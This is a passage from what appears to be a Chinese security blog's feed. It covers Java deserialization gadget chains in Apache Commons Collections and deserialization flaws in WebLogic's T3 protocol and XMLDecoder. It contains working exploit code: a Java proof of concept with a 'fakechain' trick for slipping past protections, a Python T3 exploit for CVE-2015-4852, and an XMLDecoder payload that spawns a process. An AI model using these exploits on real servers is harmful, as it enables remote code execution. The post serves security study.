class="number">1</span>);</span><br></pre></td></tr></table></figure><p>我们发现此处put的值是yy和zZ，我们如果put其他值的话是不能完成这条链的。我们看这个地方。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_5.png"></p><p>hash方法在这里会获取key值（在这里就是LazyMap对象）的key值的hash。<br>所以这里会判断hashtable中的两个key值（也就是两个LazyMap对象）的key值hash是否相同，只有相同才能下一步。<br>而yy和zZ的hash值在java中是相同的</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_6.png"></p><p>这个时候可能会有疑问，为什么LazyMap的key值不能设成一样的呢？因为设成一样的会造成如下问题</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_7.png"></p><p>在readObject时会造成elements元素的值为1</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_8.png"></p><p>elements值为1，则在此处只能进行一次循环，导致Hashtable#equals方法不能被执行（Hashtable#equals方法需要至少两个hashtable中的key值才能执行，具体逻辑见上文）。</p><h3 id="POC分析2"><a href="#POC分析2" class="headerlink" title="POC分析2"></a>POC分析2</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br></pre></td></tr></table></figure><p>我们在序列化前对hashtable进行第二次put操作时，也会调用equals方法</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_9.png"></p><p>从而会触发lazymap2的get方法，我们这里会发现调用了put方法向lazymap2增加了键值对。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_10.png"></p><p>进而导致lazymap2的结构变成了这样</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_11.png"></p><p>可以发现在value处存在一个ProcessImpl对象，这个对象没有实现序列化接口，不能被序列化，所以如果没有lazymap2.remove(“yy”)，就会导致在序列化时出现错误。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image_12.png"></p><p>所以通过lazymap2.remove(“yy”)，可以帮助我们剔除在hashtable#put时添加进lazymap2中的不可序列化的对象，实现序列化。</p><h1 id="一些trick"><a href="#一些trick" class="headerlink" title="一些trick"></a>一些trick</h1><h2 id="fakechain"><a href="#fakechain" class="headerlink" title="fakechain"></a>fakechain</h2><p>fakechain是一种对安全防护Bypass的一种手段。</p><p>给Lazymap或者TransformerMap 设置ChainedTransformer 对象时，可以在其中先放置一个空的Transformer对象，在反序列化前最后一步再通过反射将ChainedTransformer 对象内部的<code>itransformer</code>属性改回到真正的chain。（<code>itransformer</code> 属性是ChainedTransformer 内部存储Transformer对象的数组）</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image.png"></p><p>以CC1为例。</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.Retention;</span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Main</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(<span class="params">String[] args</span>) throws Exception</span> &#123;</span><br><span class="line">    <span class="comment">//定义两个chain</span></span><br><span class="line">        Transformer[] chain= <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.<span class="keyword">class</span>),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        String.<span class="keyword">class</span>, Class[].<span class="keyword">class</span> &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.<span class="keyword">class</span>, Object[].<span class="keyword">class</span> &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="literal">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123; String.<span class="keyword">class</span> &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] fakechain = <span class="keyword">new</span> Transformer[]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义一个ChainedTransformer ，并传入fakechain</span></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(fakechain);</span><br><span class="line"></span><br><span class="line">        Map innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outermap = LazyMap.decorate(innermap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor cons = clazz.getDeclaredConstructor(Class.<span class="keyword">class</span>,Map.<span class="keyword">class</span>);</span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) cons.newInstance(Override.<span class="keyword">class</span>,outermap);</span><br><span class="line">        Map Prox = (Map) Proxy.newProxyInstance(outermap.getClass().getClassLoader(), outermap.getClass().getInterfaces(),handler);</span><br><span class="line">        InvocationHandler handler1 = (InvocationHandler) cons.newInstance(Override.<span class="keyword">class</span>,Prox);  </span><br><span class="line">        </span><br><span class="line">        <span class="comment">//通过反射修改chainedTransformer对象的itransformers</span></span><br><span class="line">        Field f = ChainedTransformer.<span class="keyword">class</span>.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.<span class="keyword">set</span>(chainedTransformer, chain);</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream a = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;a.bin&quot;</span>));</span><br><span class="line">        a.writeObject(handler1);</span><br><span class="line">        ObjectInputStream b = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;a.bin&quot;</span>));</span><br><span class="line">        b.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外可以通过这种方式防止在反序列化前调用ChainedTransformer内部的chain触发命令执行，在分析代码的时候能够起到一定的帮助（减少干扰）。</p><p>reference:<a href="https://clq0.top/commons_collections_analysis/">https://clq0.top/commons_collections_analysis/</a></p><p><a href="http://wjlshare.com/archives/1535">http://wjlshare.com/archives/1535</a></p><p><a href="https://xz.aliyun.com/t/9409#toc-7">https://xz.aliyun.com/t/9409#toc-7</a></p><p><a href="https://paper.seebug.org/1242/#commons-collections-7">https://paper.seebug.org/1242/#commons-collections-7</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Apache-Commons-Collections-1&quot;&gt;&lt;a href=&quot;#Apache-Commons-Collections-1&quot; class=&quot;headerlink&quot; title=&quot;Apache-Commons-Collections 1&quot;&gt;&lt;/a&gt;Ap</summary>
      
    
    
    
    
    <category term="java开发与安全" scheme="http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>浅析weblogic 反序列化漏洞</title>
    <link href="http://const27.com/2021/11/05/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://const27.com/2021/11/05/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-11-05T13:45:25.111Z</published>
    <updated>2021-11-05T13:54:07.983Z</updated>
    
    <content type="html"><![CDATA[<p>先引用一下奇安信团队发出的weblogic历史漏洞图，可以发现以反序列化为主，反序列化问题主要来自XMLDecoder和T3协议</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211105215405027.png" alt="image-20211105215405027"></p><h2 id="T3协议"><a href="#T3协议" class="headerlink" title="T3协议"></a>T3协议</h2><p>weblogic t3协议就是weblogic的rmi所使用的协议。<br>在传统java中，rmi使用的是jrmp协议。</p><p>JRMP协议的通信由如下部分构成</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">客户端对象</span><br><span class="line">服务端对象</span><br><span class="line">客户端代理对象（stub）</span><br><span class="line">服务端代理对象（skeleton）</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152334.png" alt="QQ截图20210219152334"></p><p>而T3协议在JRMP协议上做出了改进，stub和skeleton都是动态生成的，将对象部署到RMI注册中心时weblogic会自动生成stub和skeleton。</p><p>Weblogic之所以开发T3协议，是因为他们需要可扩展，高效的协议来使用Java构建企业级的分布式对象系统</p><h3 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h3><p>我们想抓包分析T3协议有两个方法<br>1.写一个T3 rmi server和一个T3 rmi client，启动client去请求rmi server，从而实现抓包，这个方法的详细步骤在这篇文章中<a href="https://hu3sky.github.io/2020/03/20/weblogic%20t3%20%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8%E4%B8%8E%E9%98%B2%E5%BE%A1/#%E5%AE%9E%E7%8E%B0%E6%AD%A3%E5%B8%B8t3%E7%B1%BB%E7%9A%84%E8%B0%83%E7%94%A8">https://hu3sky.github.io/2020/03/20/weblogic%20t3%20%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8%E4%B8%8E%E9%98%B2%E5%BE%A1/#%E5%AE%9E%E7%8E%B0%E6%AD%A3%E5%B8%B8t3%E7%B1%BB%E7%9A%84%E8%B0%83%E7%94%A8</a></p><p>2.使用python模拟client发包，从而实现T3协议抓包分析。这个实现起来比较容易，我们就通过该方法来一窥T3协议的奥妙。<br><a href="https://xz.aliyun.com/t/10365#toc-1%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA%E5%9C%A8%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%E4%B8%AD%EF%BC%8C%E8%BF%99%E9%87%8C%E4%B8%8D%E5%86%8D%E8%B5%98%E8%BF%B0%E3%80%82">https://xz.aliyun.com/t/10365#toc-1环境的搭建在这篇文章中，这里不再赘述。</a></p><p>在完成环境搭建后，我们使用如下exp</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from os import popen</span><br><span class="line">import struct # 负责大小端的转换</span><br><span class="line">import subprocess</span><br><span class="line">from sys import stdout</span><br><span class="line">import socket</span><br><span class="line">import re</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">def generatePayload(gadget,cmd):</span><br><span class="line">    YSO_PATH &#x3D; &quot;E:\\tools\\java\\ysoserial-master-d367e379d9-1.jar&quot;</span><br><span class="line">    popen &#x3D; subprocess.Popen([&#39;java&#39;,&#39;-jar&#39;,YSO_PATH,gadget,cmd],stdout&#x3D;subprocess.PIPE)</span><br><span class="line">    return popen.stdout.read()</span><br><span class="line"></span><br><span class="line">def T3Exploit(ip,port,payload):</span><br><span class="line">    sock &#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((ip,port))</span><br><span class="line">    handshake &#x3D; &quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span><br><span class="line">    sock.sendall(handshake.encode())</span><br><span class="line">    data &#x3D; sock.recv(1024)</span><br><span class="line">    compile &#x3D; re.compile(&quot;HELO:(.*).0.false&quot;)</span><br><span class="line">    match &#x3D; compile.findall(data.decode())</span><br><span class="line">    if match:</span><br><span class="line">        print(&quot;Weblogic: &quot;+&quot;&quot;.join(match))</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;Not Weblogic&quot;)</span><br><span class="line">        #return</span><br><span class="line">    header &#x3D; binascii.a2b_hex(b&quot;00000000&quot;)</span><br><span class="line">    t3header &#x3D; binascii.a2b_hex(b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;)</span><br><span class="line">    desflag &#x3D; binascii.a2b_hex(b&quot;fe010000&quot;)</span><br><span class="line">    payload &#x3D; header + t3header  +desflag+  payload</span><br><span class="line">    payload &#x3D; struct.pack(&quot;&gt;I&quot;,len(payload)) + payload[4:]</span><br><span class="line">    sock.send(payload)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    ip &#x3D; &quot;127.0.0.1&quot;</span><br><span class="line">    port &#x3D; 7001</span><br><span class="line">    gadget &#x3D; &quot;CommonsCollections1&quot;</span><br><span class="line">    cmd &#x3D; &quot;touch &#x2F;tmp&#x2F;hack&quot;</span><br><span class="line">    payload &#x3D; generatePayload(gadget,cmd)</span><br><span class="line">    T3Exploit(ip,port,payload)</span><br></pre></td></tr></table></figure><p>指定端口和IP后，可以通过以下指令来看是否攻击成功</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec  weblogic1036jdk7u21 ls tmp&#x2F;</span><br></pre></td></tr></table></figure><p>我们通过抓取相关流量包来一窥T3协议，wireshark设置tcp.port==7001，执行以上脚本，抓取T3流量</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211031185642616.png" alt="image-20211031185642616"></p><p>发送的第一个包为T3协议头，t3后面接的使weblogic客户端版本</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211031185839574.png" alt="image-20211031185839574"></p><p>服务器会返回应答，并在HELO 后接weblogic服务端版本，利用这个特性可以刺探weblogic服务器版本</p><p><img src="C:\Users\14216\AppData\Roaming\Typora\typora-user-images\image-20211031190051255.png" alt="image-20211031190051255"></p><p>接下来客户端会发送一个相对比较大的数据包，其内容分析如下</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211031204848507.png" alt="image-20211031204848507"></p><p>数据包仅为蓝色部分的内容，第一个框中是数据包的长度，第二个框是反序列化标志，两个框中间是T3协议头，剩下的便是序列化数据。</p><p>T3协议发送序列化数据时有时候并不只发送一段序列化数据，它可能会发送多个序列化数据，彼此之间以反序列化标志隔开，就像这样</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211031210027329.png" alt="image-20211031210027329"></p><h3 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h3><p>漏洞版本</p><blockquote><p>10.3.6.0, 12.1.2.0, 12.1.3.0, and 12.2.1.0</p></blockquote><p>上面的exp就是哪来打这个洞的，上述CVE版本没有对T3反序列化安全问题做任何防范，利用T3协议反序列化CC链。jdk1.7，weblogic10.3.6.0 用cc链1，3，6都能打。</p><p>这个洞可以说是weblogic反序列化漏洞的源头了。</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p><strong>weblogic.rjvm.InboundMsgAbbrev#readObject</strong></p><p>作为入口的readObject方法就在此处，在此中调用了InboundMsgAbbrev.ServerChannelInputStream的readObject方法，var1即是序列化后的数据，我们进行一个跟进</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211031213830584.png" alt="image-20211031213830584"></p><p><strong>InboundMsgAbbrev.ServerChannelInputStream#readObject</strong></p><p>跟进后发现此类继承自ObjectInputStream且未重写readObject方法<br>也就是说序列化数据传入后直接以参数的形式传入了ObjectInputStream对象，并调用了其readObject方法。<br>于是便畅通无阻的触发了反序列化漏洞</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211031215946437.png" alt="image-20211031215946437"></p><h4 id="resolveClass"><a href="#resolveClass" class="headerlink" title="resolveClass"></a>resolveClass</h4><p>这里之所以要说一下resolveClass，是因为网上很多T3反序列化相关文章都提了这个东西，也是我之前不知道的一个东西，所以便记录一下。</p><p>resolveClass是ObjectInputStream.readObject()中必经的一个方法，也就是说在反序列化过程中，序列化的数据都会从resolveClass这个方法中经过一次。</p><p>这个方法的作用是类的序列化描述符加工成该类的Class对象，很多针对反序列化Gadget的拦截都是通过重写此方法完成的（如通过黑名单来禁止某类反序列化）</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211101162703325.png" alt="image-20211101162703325"></p><p>贴上一张廖师傅的博客的反序列化攻击时序图：<br>可以看到反序列化拦截位置除了resolveClass以外还有一个resolveProxyClass，它用于返回实现了代理类描述符中所有接口的代理类，这里不对该方法展开叙述，它也可以被用作反序列化攻击的拦截</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211101134646925.png" alt="image-20211101134646925"></p><p>上文在分析CVE-2015-4852时，InboundMsgAbbrev.ServerChannelInputStream类重写了resolveClass，如果重写得当那么就可以起到缓解反序列化漏洞的作用，可惜这个类直接调用了父类的resolveClass</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211101162325788.png" alt="image-20211101162325788"></p><h2 id="XMLDecoder"><a href="#XMLDecoder" class="headerlink" title="XMLDecoder"></a>XMLDecoder</h2><p>XMLDecoder是一套用于对XML进行序列化或反序列化的一套API，它在JDK1.4就已经被开发了出来，它对XML的解析模式并不是更为人所知的DOM解析，而是SAX解析。<br>DOM解析在解析XML时会读取所有数据然后生成DOM树来解析，而SAX则是线性读取XML，所以SAX解析XML性能消耗相对较小。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211102152704874.png" alt="image-20211102152704874"></p><h3 id="apache-xerces"><a href="#apache-xerces" class="headerlink" title="apache xerces"></a>apache xerces</h3><p>apache xerces是XMLDecoder解析XML时的一个重要组件。<br>apache xerces是一个用于解析XML中有哪些标签，语法是否合法的解析器，官方在JDK1.5便集成了此解析器并作为XML的默认解析器。</p><p>在XML序列化数据传达至XMLDecoder.readObject() 方法进行反序列化等操作后，便会传递给xerces进行解析，在xerces解析完毕后数据便会交给DocumentHandler完成后续的操作，如果是JDK1.6便会交给ObjectHandler进行处理。</p><h3 id="DocumentHandler"><a href="#DocumentHandler" class="headerlink" title="DocumentHandler"></a>DocumentHandler</h3><p>DocumentHandler（com.sun.beans.decoder.DocumentHandler）在XMLDecoder处理XML数据时起到事件处理器的作用，它在JDK1.7中被实现。<br>它会跟进传入的XML标签，属性等信息调用不同的Handler进行事件处理<br>我们针对XMLDecoder的反序列化攻击便是传入特定的XML序列化数据由DocumentHandler进行事件处理，进而实现RCE等攻击。</p><p>下图是jdk1.7 DocumentHandler中所定义的各种标签的处理办法。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211102154241440.png" alt="image-20211102154241440"></p><p>JDK1.6中也有个和DocumentHandler功能类似的ObjectHandler，但是它实现的标签远少于DocumentHandler，且远不如其规范化。下图是ObjectHandler的部分代码。</p><p>“值得注意的是CVE-2019-2725的补丁绕过其中有一个利用方式就是基于JDK1.6。”</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211102154904139.png" alt="image-20211102154904139"></p><p>下面举例一下各标签的作用</p><p><strong>string</strong></p><p>&lt;string&gt;aaa&lt;/string&gt;</p><p>的意思就是表示一段值为aaa的字符串，这个标签一般与其他标签一起用来达到一些效果</p><p><strong>object</strong></p><p>object标签表示一个对象，其class属性指定类名，method属性指定某方法名（构造方法方法名为new）</p><p>如 new A(“test”); 的xml文档表现为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;object class&#x3D;&quot;A&quot; method&#x3D;&quot;new&quot;&gt;</span><br><span class="line">&lt;string&gt;test&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;object&gt;</span><br></pre></td></tr></table></figure><p><strong>void</strong></p><p>void一般与其他标签搭配使用，它也有method，class等属性，于是它和object标签十分相像。</p><p>void一般用于函数调用并通过method属性指定方法名，以及其他辅助作用（如array标签中充当索引）</p><p>如A a = new A(); A.foo(“test”); 的xml文档表现为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;object class&#x3D;&quot;A&quot;&gt;</span><br><span class="line">    &lt;void method&#x3D;&quot;foo&quot;&gt;</span><br><span class="line">    &lt;string&gt;test&lt;&#x2F;string&gt;</span><br><span class="line">    &lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;object&gt;</span><br></pre></td></tr></table></figure><p><strong>array</strong></p><p>array标签用于表示数组，class属性指定类名，内部通过void标签的index属性设置索引</p><p>如 String[] a = new String[];s[1]=”test” 的xml表现形式为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;array class&#x3D;&quot;java.lang.String&quot;&gt;</span><br><span class="line">    &lt;void index&#x3D;&quot;1&quot;&gt;</span><br><span class="line">    &lt;string&gt;test&lt;&#x2F;string&gt;</span><br><span class="line">  &lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;array&gt;</span><br></pre></td></tr></table></figure><h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><p>不同的XML标签对应着不同的handler，也就对应着不同的处理机制。<br>大多数handler都有addAttribute方法，这个方法主要用于提取标签中的属性并进行处理；<br>以及getValueObject方法，这个方法主要用于获取标签的值。</p><p>首先以java标签为例：var1对应着属性名，var2对应着属性值。java标签会根据class属性中的值进行类加载。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211102162202707.png" alt="image-20211102162202707"></p><p>再来看看New标签：和java标签的handler类似，它也会进行类加载操作，不过NewElementHandler是许多handler的父类（如ArrayElementHandler，ObjectElementHandler），这就意味着NewElementHandler的子类也可以进行类加载</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211102162638378.png" alt="image-20211102162638378"></p><p>在上文中提到object标签有进行类加载的能力，是因为其class属性是由父类NewElementHandler进行处理的。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103141517211.png" alt="image-20211103141517211"></p><p>而void标签之所以和object标签如此相像的原因是，VoidElementHandler继承自ObjectElementHandler，且仅重写了一个isArgument方法，其它都和父类一样。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103141611207.png" alt="image-20211103141611207"></p><p>再来看看array，它也是一个很重要的标签</p><h3 id="Demo调试"><a href="#Demo调试" class="headerlink" title="Demo调试"></a>Demo调试</h3><p>从上文大概知道XMLDecoder处理xml的流程为 :XMLDecoder.readObject() -&gt;xerces解析-&gt;DocumentHandler事件处理，那不如写个Demo调试一下看看具体过程如何</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.beans.XMLDecoder;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) throws FileNotFoundException &#123;</span><br><span class="line">         String s &#x3D; &quot;&lt;java version&#x3D;\&quot;1.7.0_80\&quot; class&#x3D;\&quot;java.beans.XMLDecoder\&quot;&gt;\n&quot; +</span><br><span class="line">                 &quot; &lt;object class&#x3D;\&quot;java.lang.ProcessBuilder\&quot;&gt;\n&quot; +</span><br><span class="line">                 &quot;  &lt;array class&#x3D;\&quot;java.lang.String\&quot; length&#x3D;\&quot;1\&quot;&gt;\n&quot; +</span><br><span class="line">                 &quot;    &lt;void index&#x3D;\&quot;0\&quot;&gt;&lt;string&gt;calc&lt;&#x2F;string&gt;&lt;&#x2F;void&gt;\n&quot; +</span><br><span class="line">                 &quot;  &lt;&#x2F;array&gt;\n&quot; +</span><br><span class="line">                 &quot;  &lt;void method&#x3D;\&quot;start\&quot;&gt;&lt;&#x2F;void&gt;\n&quot; +</span><br><span class="line">                 &quot; &lt;&#x2F;object&gt;\n&quot; +</span><br><span class="line">                 &quot;&lt;&#x2F;java&gt;&quot;;</span><br><span class="line">        StringBufferInputStream stringBufferInputStream &#x3D; new StringBufferInputStream(s);</span><br><span class="line">        XMLDecoder xmlDecoder &#x3D; new XMLDecoder(stringBufferInputStream);</span><br><span class="line">        Object o &#x3D; xmlDecoder.readObject();</span><br><span class="line">        System.out.println(o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接开始动调，在demo中xmlDecoder.readObject() 处下断点。跟进。</p><h4 id="readObject"><a href="#readObject" class="headerlink" title="readObject"></a>readObject</h4><p>跟进readObject,可以发现调用了parsingComplete(),继续跟进</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103150406152.png" alt="image-20211103150406152"></p><p>java.beans.XMLDecoder#parsingComplete, 因为我们跟踪的是对XML的解析过程，所以这个parse方法就很可疑，而且又因为是可跟进的，所以我们对其进行一个跟进</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103190636095.png" alt="image-20211103190636095"></p><p>com.sun.beans.decoder.DocumentHandler#parse,又发现一个parse，跟进</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103191553843.png" alt="image-20211103191553843"></p><p>com.sun.org.apache.xerces.internal.jaxp. SAXParserImpl#parse,又找到一个parse，跟进</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103191733578.png" alt="image-20211103191733578"></p><p>com.sun.org.apache.xerces.internal.jaxp. SAXParserImpl#parse，发现跟进来的这个parse是重载方法，在其中又发现了parse，再跟</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103191905287.png" alt="image-20211103191905287"></p><p>com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser#parse,发现parse，又跟</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103192132155.png" alt="image-20211103192132155"></p><p>com.sun.org.apache.xerces.internal.parsers.XMLParser#parse</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103192259557.png" alt="image-20211103192259557"></p><p>com.sun.org.apache.xerces.internal.parsers. XML11Configuration#parse</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103192350388.png" alt="image-20211103192350388"></p><p>com.sun.org.apache.xerces.internal.parsers. XML11Configuration#parse,上一个parse的重载，其中调用了一个叫scanDocument的方法</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103195452940.png" alt="image-20211103195452940"></p><p>跟进scanDocument，到这里就已经进入了xerces解析了。这里有个do..while循环，作用是提取XML标签</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211104135729090.png" alt="image-20211104135729090"></p><p>调用链:</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211104140128888.png" alt="image-20211104140128888"></p><h4 id="ScanDocument"><a href="#ScanDocument" class="headerlink" title="ScanDocument"></a>ScanDocument</h4><p>我们来看一下scanDocument这个方法。    这里循环执行了next()方法，在前十几个循环里，这个方法对XML进行了解析和事件处理。大致的处理流程是对每一个解析到的标签先实例化对应的handler，然后循环调用addAttribute方法获取其所有属性并进行一定的事件处理，当解析到某个标签的结束标签时(如&lt;/java&gt;) 便会调用getValueObject 获取标签中的值的信息。这里借用一个图</p><p><img src="https://image.3001.net/images/20200820/1597902334.png!small" alt="img"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  public boolean scanDocument(boolean complete) throws IOException, XNIException &#123;</span><br><span class="line">      this.fEntityManager.setEntityHandler(this);</span><br><span class="line">      int event &#x3D; this.next();</span><br><span class="line">      </span><br><span class="line">do &#123;</span><br><span class="line">          switch(event) &#123;</span><br><span class="line">          case 1:</span><br><span class="line">          case 2:</span><br><span class="line">          case 6:</span><br><span class="line">..................</span><br><span class="line"> case 12:</span><br><span class="line">              this.fDocumentHandler.startCDATA((Augmentations)null);</span><br><span class="line">              this.fDocumentHandler.characters(this.getCharacterData(), (Augmentations)null);</span><br><span class="line">              this.fDocumentHandler.endCDATA((Augmentations)null);</span><br><span class="line"></span><br><span class="line">          event &#x3D; this.next();</span><br></pre></td></tr></table></figure><p>下面的调试我对XML中所涉及的所有handler的所有方法均下了断点以方便调试。</p><p>我们XML中第一个标签是JAVA，于是我们在JavaElementHandler各方法下断点后，可以发现next方法内部会先实例化JavaElementHandler，然后调用addAttribute，将获取的类对象(java.beans.XMLDecoder)置入this。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211104193157735.png" alt="image-20211104193157735"></p><p>然后自然是解析object标签，由于ObjectElementHandler未定义对class属性的解析，所以会调用父类NewElementHandler对其进行解析，将获取的类对象(java.lang.ProcessBuilder)置入this</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211104193433518.png" 